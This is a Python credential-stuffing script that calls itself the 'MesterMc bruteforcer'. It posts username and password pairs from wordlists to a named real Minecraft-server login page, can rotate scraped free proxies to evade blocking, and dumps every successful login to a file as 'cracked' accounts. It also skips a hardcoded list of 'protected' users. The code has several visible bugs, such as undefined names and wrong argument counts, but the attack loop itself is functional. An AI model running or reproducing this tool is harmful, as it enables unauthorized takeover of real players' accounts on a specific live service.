
import urllib.request , socket, random, requests, os, time, threading
from time import time, gmtime, strftime
from colorama import Fore

socket.setdefaulttimeout(180)

success_accs = {}
success = 0
failed = 0
counter = 1

proxy_bool = False

usernames_counter = 0
passwords_counter = 0
proxy_counter = 0

usernames = {}
passwords = {}
proxys = {}
buffer = {}

blacklisted_accs = ["Dominika0619", "milkaboci19", "_apucikislanya_", "Levi2288", "LEVI2288", "AkiraUser"]


def GenerateAccount(username, pw):
    global success
    global failed, proxy_bool, proxys, buffer
    buffer.clear()

    blacklist_array_length = len(blacklisted_accs)
    for x in range(blacklist_array_length):
        if blacklisted_accs[x] not in username:
            continue
        else:
            print(f"[{Fore.RED}-{Fore.RESET}] Protected user found skipping")
            return 0
    for i in range(10):
        try:
            if proxy_bool == True:
                buffer = {
                    "http": "http://" + random.choice(proxys),
                }
            else:
                buffer = {
                    "http": None,
                }

            msg_return = requests.post(f'http://banyakozpont.mestermc.hu/', data={"username": {username}, "password": {pw}, "getmodule": "login"}, proxies=buffer, timeout=3)

            print(msg_return.content)
            if msg_return.history:
                for resp in msg_return.history:
                    print(resp.status_code, resp.url)
            if msg_return.status_code == 200:
                f = open("return.txt", "wb")
                for line in msg_return.iter_lines():
                    f.write(line)
                    if b"Fontos" not in line:
                        continue
                    else:
                        print("Generation returned success | Redirection capture success and found new site")
                        break
                print(f"[{Fore.GREEN}+{Fore.RESET}] Valid : {Fore.GREEN}{username}{Fore.RESET} pass: {Fore.GREEN}{pw}{Fore.RESET}")
                success_accs[success] = f"{username}:{pw}"
                success+=1
            elif msg_return.status_code == 404:
                print(f"[{Fore.RED}-{colors.reset}] Failed {Fore.RED}404{msg_return.status_code}{Fore.RESET} code returned")
                failed+=1
            else:
                print(f"[{Fore.RED}-{Fore.RESET}] Failed status code returned {Fore.RED}{msg_return.status_code}{Fore.RESET}")

            break
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Failed Reason: {e}")
            continue

        msg_return.close

def job_finish():
    counter = 0
    current_time = strftime("%Y-%m-%d_%H-%M-", gmtime())
    dump_file = f"accounts/account_dump_{current_time}.txt"

    if os.path.isdir("accounts/") == False:
        os.mkdir("accounts")
    with open(dump_file, 'w') as f:
        while counter < success:
            f.write(success_accs[counter])
            counter += 1
    print(f"[{Fore.BLUE}?{Fore.RESET}] Cracked {success} account(s)")
    print(f"[{Fore.BLUE}?{Fore.RESET}] All accounts has been dumped to {dump_file}")
    print(f"[{Fore.BLUE}?{Fore.RESET}] Thanks for using Levi2288 MesterMc bruteforcer")

def checker(i):

    proxy = 'http' + '://' + i
    proxy_support = urllib.request.ProxyHandler({"http": proxy})
    opener = urllib.request.build_opener(proxy_support)
    urllib.request.install_opener(opener)
    req = urllib.request.Request("http" + '://' + "http://google.com/")
    req.add_header('User-agent', 'Mozilla/5.0')
    try:
        start_time = time()
        urllib.request.urlopen(req, timeout=1800)
        end_time = time()
        time_taken = end_time - start_time
        print (f"[{Fore.GREEN}+{Fore.RESET}] %s works!" % proxy)
        print(f'[{Fore.BLUE}?{Fore.RESET}] time: ' + str(time_taken))
        return True
    except Exception as e:
        print(f'[{Fore.RED}-{Fore.RESET}] {e}')
        pass
        print (f"[{Fore.RED}-{Fore.RESET}] %s does not respond.\n" % proxy)
        return False

def Scrape():
    global proxy_counter, proxys
    print(f"[{Fore.GREEN}+{Fore.RESET}] Scraping proxies...")
    proxy_list = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&country=all")
    list = proxy_list.text
    with open("proxies.txt", "w") as file:
        file.write(list.replace("\n", ""))
    with open("proxies.txt") as file:
        for line in file:
            if proxy_counter <= 50:
              if line.strip:
                proxys[proxy_counter] = line.replace("\n", "")
                proxy_counter += 1
            else:
                break
    print(f"[{Fore.GREEN}+{Fore.RESET}] Finished!")

def main():

    global passwords_counter, usernames_counter, passwords, usernames, proxy_counter, proxys, working_proxy, proxy_bool

    proxy_bool = False
    loop = 0

    file_user = input("File With the Usernames: ")

    while os.path.isfile(file_user) == False:
        print(f"{Fore.RED}File Not Found!{Fore.RESET}")
        file_user = input("File With the Usernames: ")
    else:
        print(f"{Fore.GREEN}File Found!{Fore.RESET}")
        with open(file_user) as infp:
            for line in infp:
                if line.strip:
                    usernames[usernames_counter] = line.replace("\n", "")
                    usernames_counter += 1


    file_pw = input("File With the Passwords: ")

    while os.path.isfile(file_pw) == False:
        print(f"{Fore.RED}File Not Found!{Fore.RESET}")
        file_pw = input("File With the Passwords: ")
    else:
        print(f"{Fore.GREEN}File Found!{Fore.RESET}")
        with open(file_pw) as infp:
            for line in infp:
                if line.strip():
                    passwords[passwords_counter] = line.replace("\n", "")
                    passwords_counter += 1
    proxy_str = str(input("Use proxy (Y/N): "))
    proxy_str.lower()
    if proxy_str == "y" or proxy_str == "yes" or proxy_str == "1":
        proxy_bool = True

    if proxy_bool == True:
        print("1 | AutoScrape proxy\n2 | Proxys from file")
        proxy_mode = int(input("Proxy Mode: "))

        if proxy_mode == 1:
            Scrape()

        elif proxy_mode == 2:
            proxy_file = input("Proxy file: ")
            while os.path.isfile(proxy_file) == False:
                print(f"{Fore.RED}File Not Found!{Fore.RESET}")
                file_user = input("Proxy file: ")
            else:
                print(f"{Fore.GREEN}Proxy File Found!{Fore.RESET}")
                with open(file_user) as infp:
                    for line in infp:
                        if line.strip:
                            proxys[proxy_counter] = line.replace("\n", "")
                            proxy_counter += 1

        proxy_check = input("Check proxy(s) (Y/N): ")
        proxy_check.lower()
        if proxy_check == "y" or proxy_check == "yes":
            working_proxy = {}
            counter = 0
            for item in proxys:
                if checker(proxys[item]):
                    working_proxy[counter] = proxys[item]
                    counter += 1
            counter = 0
            clear(proxys)
            for item in working_proxy:
                proxys[item] = working_proxy[item]

    if usernames_counter > passwords_counter:
        while loop <= passwords_counter:
            GenerateAccount(usernames[loop], passwords[loop], proxys[loop])

            loop += 1
            #time.sleep(2.1)
        else:
            job_finish()
    else:
        while loop < usernames_counter:

            GenerateAccount(usernames[loop], passwords[loop])
            loop += 1
            #time.sleep(2.1)
        else:
            job_finish()
    



    
if __name__ == '__main__':
    main()
